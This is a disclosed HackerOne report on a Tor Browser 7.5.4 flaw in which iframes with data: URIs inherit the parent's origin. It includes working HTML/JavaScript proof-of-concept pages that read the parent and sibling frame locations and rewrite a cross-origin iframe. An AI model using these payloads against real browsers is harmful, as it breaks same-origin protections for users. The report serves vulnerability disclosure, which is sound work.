---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - env/web
substate: "informative"
weakness: null
enriched: true
body: true
date: 2018-06-06
submitted: 2018-05-27T00:30:07.597Z
bounty_usd: null
votes: 0
cve: []
program: "[[programs/torproject|Tor]]"
reporter: "metnew"
source: "https://hackerone.com/reports/358005"
title: "Tor Browser: iframe with `data:` uri  has access to parent window"
---
# Tor Browser: iframe with `data:` uri  has access to parent window

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 0 | **Program:** Tor | **Disclosed:** 2018-06-06

- Report: [https://hackerone.com/reports/358005](https://hackerone.com/reports/358005)
- CWE: N/A
- Submitted: 2018-05-27T00:30:07.597Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Version:
7.5.4 (based on Mozilla Firefox 52.8.0)
Tested with standard security slider. However, it's likely to be possible with a higher security level.

## Summary

In Tor Browser iframe with `data:uri` inherits the origin of parent window.
That leads to iframe has access to parent window.

## PoC

### Iframe could access parent window's location

>  iframe-access-parent.html 
```html
<body>
    <script>
        let f = document.body.appendChild(document.createElement('iframe'))
        f.src =
            'data:text/html,' +
            `<script>alert(parent.location)</scrip` + `t>` 
        // should throw "SecurityError...", instead `alert()` works
    </script>
</body>
```

### iframe could access another iframe with src=data uri

> data-uri-access-another-data-uri.html
```html
<body>
    <script>
        let g = document.body.appendChild(document.createElement('iframe'))
        let f = document.body.appendChild(document.createElement('iframe'))

        g.src =
            'data:text/html,' + 'First iframe with data:uri'

        f.src =
            'data:text/html,' +
            `Second iframe with data:uri <script>alert("Iframe with data:uri could access another same-origin iframe with data:uri, first iframe location is: " + parent.window.frames[0].location.href)</scr` + `ipt>`

    </script>
</body>
```

### data:uri iframe could rewrite content of another cross-origin iframe via data:uri

##### 127.0.0.1:5000/exploit.html

```html
<body>
    <script>
        let g = document.body.appendChild(document.createElement('iframe'))
        let f = document.body.appendChild(document.createElement('iframe'))

        g.src =
            'http://127.0.0.1:5001/5001.html'

        g.onload = () => {
            f.src =
                'data:text/html,' +
                `Second iframe with data:uri 
                <script>
                    if (!parent.window.frames[0][0]) {
                        console.log('This block called in the context of |Second iframe with data:uri|');
                        console.log('If first script sets parent.window.location to some valid value');
                        console.log('it removes parent.window.frames[0][0].location from the DOM');
                        console.log('Tor re-runs script in this cause, but in context of this window');
                        console.log('e.g. window with |Second iframe with data:uri| text');
                    } else {
                        parent.window.frames[0][0].location = "data:text/html,5000 iframe rewrites  5001<script>
                        window.onload = () => {
                            console.log('This block called in the context of |5000 iframe rewrites 5001|');
                            parent.window.location = 'about:blank'
                        }
                        </scr" + "ipt>";
                    }
                    
                </scr` + `ipt>`
        }

    </script>
    <h4>we could rewrite data:uri in crossdomain windows</h4>
</body>
```

##### 127.0.0.1:5001/5001.html
```html
<html>

<body>
    <script>
        let y = document.body.appendChild(document.createElement('iframe'))
        y.src = 'data:text/html,datauri 5001'
    </script>
</body>

</html>
```

The iframe from 5000 port could rewrite an iframe in a different origin, but it doesn't have access to "parent" at 5001 port, so direct UXSS is impossible.

> Also, there is an interesting case described in PoC. Function in the iframe from port 5000 called twice in different contexts. 

## Expected behavior

### 1. In latest Chrome, Firefox, Safari iframe with `data:` uri has `null` origin and can't access parent window's location.

PoC in Chrome/FF/Safari throws error:

```
SecurityError: Blocked a frame with origin "null" from accessing a frame with origin "http://127.0.0.1:5000".  The frame requesting access has a protocol of "data", the frame being accessed has a protocol of "http". Protocols must match.
```

### 2. iframe can't rewrite another iframe's content via data uri.
Same as in the 1 case.

```
SecurityError: Permission denied to access property "href" on cross-origin object
```

### 3.

FF
```
NS_ERROR_DOM_PROP_ACCESS_DENIED: Access to property denied
```

Chrome/Safari
```
Unsafe JavaScript attempt to initiate navigation for frame with URL...
SecurityError: The operation is insecure.
```

## Impact

Partial SOP violation. 
Direct UXSS seems impossible, but described behavior opens a wide range of attack scenarios.
1. Any malicious iframe src=`data:uri` could access parent
2. Any malicious iframe src=`data:uri` could rewrite other frames's location (to data:uri too) in DOM using `parent.window.frames`

## Timeline

- **Report Filed**
- **2018-05-28** @geko: What do you mean with "latest Firefox"? There is more than one latest Firefox: There is Firefox 60.0.1, Firefox 60.0.1 ESR, and Firefox 52.8.0 ESR. We are still following the ESR 52 series while we are preparing the switch to ESR 60. Are you claiming that Firefox 52.8.0 ESR does not inhibit that flaw while Tor Browser 7.5.4 does? If not, have you contacted Mozilla to report this bug as well? To test a normal Firefox 52.8.0 ESR you can download a version from https://www.mozilla.org/en-US/firefox/organizations/all/#legacy.
- **Report Needs More Info**
- **Report New**
- **Report Informative**
- **2018-05-28** @metnew: I filled a report to Mozilla, but as I understand, ESR should be patched against this, so that's a vulnerability anyway. Hope, they will qualify it as a valid security bug, because of Tor.
Thanks for a quick response!
- **2018-05-30** @geko: Could you give us a link to your bug report, so that we can follow it?
- **2018-05-30** @metnew: https://bugzilla.mozilla.org/show_bug.cgi?id=1464884
- **Agreed On Going Public**
- **2018-06-06** @metnew: FF team rejected to fix this problem in ESR52 and ESR60, so Tor browser will continue being vulnerable against this.
Link: https://bugzilla.mozilla.org/show_bug.cgi?id=1464884
- **Agreed On Going Public**
- **Report Became Public**
